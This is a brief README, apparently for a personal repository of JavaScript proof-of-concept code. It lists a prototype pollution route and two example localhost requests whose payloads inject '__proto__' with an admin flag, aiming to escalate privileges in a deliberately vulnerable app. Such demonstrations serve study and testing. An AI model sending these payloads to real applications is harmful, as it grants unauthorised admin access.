# Javascript code

### All the POCs and garbage code goes here.

* Parameter Pollution - `routes/prototypepollution`

    Request - `http://localhost:3000/proto?attr=__proto__&value={"admin":"true"}`
    Request - `http://localhost:3000/proto/2?value={"__proto__":{"admin":"true"}}`